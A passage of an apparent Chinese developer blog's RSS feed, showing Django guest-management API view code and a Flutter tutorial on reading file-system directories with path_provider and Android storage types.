            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询成功&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;datas&amp;#39;&lt;/span&gt;: datas})
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10022&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询的数据不存在&amp;#39;&lt;/span&gt;})


&lt;span style=&#34;color:#75715e&#34;&gt;# 添加嘉宾接口&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add_guest&lt;/span&gt;(request):
    &lt;span style=&#34;color:#75715e&#34;&gt;# POST请求&lt;/span&gt;
    eid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    realname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;realname&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    phone &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POST&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; realname &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; phone &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; email &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10021&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;参数错误&amp;#39;&lt;/span&gt;}, json_dumps_params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ensure_ascii&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;})

    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; result:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10022&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会id不存在&amp;#39;&lt;/span&gt;})

    &lt;span style=&#34;color:#75715e&#34;&gt;# 判断发布会状态是否有效&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; result:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10023&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会状态无效&amp;#39;&lt;/span&gt;})

    &lt;span style=&#34;color:#75715e&#34;&gt;# object.get 只返回一条数据，发布会只有一个，filter 返回对象查询集，一个发布会下有多个嘉宾&lt;/span&gt;
    event_limit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;limit  &lt;span style=&#34;color:#75715e&#34;&gt;# 发布会限制人数&lt;/span&gt;
    guest_limit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Guest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(event_id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)  &lt;span style=&#34;color:#75715e&#34;&gt;# 发布会已添加的嘉宾数&lt;/span&gt;

    print(len(guest_limit))
    print(event_limit)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(guest_limit) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; event_limit:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10024&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会人数已满&amp;#39;&lt;/span&gt;})

    event_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_time
    &lt;span style=&#34;color:#75715e&#34;&gt;# 日期字符串转换成日期对象&lt;/span&gt;
    timeArray &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strptime(str(event_time), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%Y-%m-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; %H:%M:%S&amp;#34;&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# 返回以秒的日期，入参struct_time。&lt;/span&gt;
    e_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mktime(timeArray))
    &lt;span style=&#34;color:#75715e&#34;&gt;# 获取当前时间(单位:秒)&lt;/span&gt;
    n_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time())
    print(e_time)
    print(n_time)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n_time &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; e_time:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10025&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会已经开始了&amp;#39;&lt;/span&gt;})

    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        Guest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(event_id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int(eid), phone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;int(phone), sign&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, realname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;realname, email&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;email)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; IntegrityError:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10026&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;手机号码重复&amp;#39;&lt;/span&gt;})
    result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)
    new_result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; serializers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;serialize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;json&amp;#39;&lt;/span&gt;, result2)
    print(result2)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;成功添加嘉宾&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;datas&amp;#39;&lt;/span&gt;: json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;loads(new_result)})


&lt;span style=&#34;color:#75715e&#34;&gt;# 查询嘉宾接口&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_guest_list&lt;/span&gt;(request):
    &lt;span style=&#34;color:#75715e&#34;&gt;# GET请求&lt;/span&gt;
    eid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eid&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 关联发布会id&lt;/span&gt;
    phone &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10021&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;发布会id不能为空&amp;#39;&lt;/span&gt;})
    &lt;span style=&#34;color:#75715e&#34;&gt;# 输入发布会id查询,查询发布会下所有嘉宾&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; phone &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        datas &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Guest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(event_id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; results:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; results:
                guest_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
                guest_list[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;realname&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;realname
                guest_list[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;phone
                guest_list[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;email
                guest_list[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sign&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign
                datas&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(guest_list)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询成功&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;datas&amp;#39;&lt;/span&gt;: datas})
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10022&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询的数据不存在&amp;#39;&lt;/span&gt;})
    
    &lt;span style=&#34;color:#75715e&#34;&gt;# 查询发布会下某个嘉宾&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; eid &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; phone &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        guest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
            result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Guest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(event_id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;eid, phone&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;phone)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ObjectDoesNotExist:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10023&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询的结果为空&amp;#39;&lt;/span&gt;})
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            guest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;realname&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;realname
            guest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;phone
            guest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sign&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign
            guest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;email
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; JsonResponse({&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;查询成功&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;datas&amp;#39;&lt;/span&gt;: guest})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考链接：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/liudinglong/p/12333665.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Django Web接口开发  @全栈测试开发日记  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Flutter—读取手机文件路径</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E8%AF%BB%E5%8F%96%E6%89%8B%E6%9C%BA%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</link>
        <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E8%AF%BB%E5%8F%96%E6%89%8B%E6%9C%BA%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文： &lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/2eafae001f55&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【Flutter 实战】文件系统目录  @老孟程序员 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1添加依赖&#34;&gt;1.添加依赖&lt;/h2&gt;
&lt;p&gt;在项目的 &lt;code&gt;pubspec.yaml&lt;/code&gt; 文件中添加依赖：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;dependencies&lt;/span&gt;:
     &lt;span style=&#34;color:#f92672&#34;&gt;path_provider&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;^1.6.14&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;flutter pub get
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2获取文件路径&#34;&gt;2.获取文件路径&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;getTemporaryDirectory&lt;/p&gt;
&lt;p&gt;临时目录，适用于下载的缓存文件，此目录随时可以清除，此目录为应用程序私有目录，其他应用程序无法访问此目录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getApplicationSupportDirectory&lt;/p&gt;
&lt;p&gt;应用程序可以在其中放置应用程序支持文件的目录的路径。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getLibraryDirectory&lt;/p&gt;
&lt;p&gt;应用程序可以在其中存储持久性文件，备份文件以及对用户不可见的文件的目录路径，例如storage.sqlite.db。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getApplicationDocumentsDirectory&lt;/p&gt;
&lt;p&gt;应用程序可能在其中放置用户生成的数据或应用程序无法重新创建的数据的目录路径。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getExternalStorageDirectory&lt;/p&gt;
&lt;p&gt;应用程序可以访问顶级存储的目录的路径。由于此功能仅在Android上可用，因此应在发出此函数调用之前确定当前操作系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getExternalCacheDirectories&lt;/p&gt;
&lt;p&gt;存储特定于应用程序的外部缓存数据的目录的路径。 这些路径通常位于外部存储（如单独的分区或SD卡）上。 电话可能具有多个可用的存储目录。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getExternalStorageDirectories&lt;/p&gt;
&lt;p&gt;可以存储应用程序特定数据的目录的路径。 这些路径通常位于外部存储（如单独的分区或SD卡）上。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;getDownloadsDirectory&lt;/p&gt;
&lt;p&gt;存储下载文件的目录的路径，这通常仅与台式机操作系统有关。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3android-文件存储&#34;&gt;3.Android 文件存储&lt;/h2&gt;
&lt;p&gt;Android 文件存储分为内部存储和外部存储。&lt;/p&gt;
&lt;h3 id=&#34;a内部存储&#34;&gt;a.内部存储&lt;/h3&gt;
&lt;p&gt;用于保存应用的私有文件，其他应用无法访问这些数据，创建的文件在此应用的包名目录下，没有 root 权限 的手机无法在手机的 文件管理 应用中看到此目录，不过可以通过 Android Studio 工具查看，路径为：data/data/包名。包名下具体的目录结构为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cache 目录：对应 getTemporaryDirectory 方法，用于缓存文件，此目录随时可能被系统清除。&lt;/li&gt;
&lt;li&gt;files 目录：对应 getApplicationSupportDirectory 方法。&lt;/li&gt;
&lt;li&gt;code_cache：此目录存储 Flutter 相关代码和资源。&lt;/li&gt;
&lt;li&gt;shared_prefs： SharePreferences 的默认路径。&lt;/li&gt;
&lt;li&gt;app_flutter：对应 getApplicationDocumentsDirectory方法。&lt;/li&gt;
&lt;li&gt;app_flutter/dbName：使用 sqlite 的默认路径，sqlite 也可以指定位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内部存储的特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安全性，其他应用无法访问这些数据。&lt;/li&gt;
&lt;li&gt;当应用卸载的时候，这些数据也会被删除，避免垃圾文件。&lt;/li&gt;
&lt;li&gt;不需要申请额外权限。&lt;/li&gt;
&lt;li&gt;存储的空间有限，此目录数据随时可能被系统清除，也可以通过 设置 中的 清除数据 可以清除此目录数据。&lt;/li&gt;
&lt;li&gt;国内特色，不同手机厂商对此目录做了不同的限制，比如总体大小限制、单个应用程序所占空间大小限制、清除数据策略不同等。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;b外部存储&#34;&gt;b.外部存储&lt;/h3&gt;
&lt;p&gt;外部存储可以通过手机的 文件管理 应用查看。这里面有一个特殊的目录：Android/data/包名。和内部存储目录非常相似，一个包名代表一个应用程序：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cache：缓存目录，对应 getExternalCacheDirectories 方法。&lt;/li&gt;
&lt;li&gt;files：对应 getExternalStorageDirectories 方法。&lt;/li&gt;
&lt;/ul&gt;
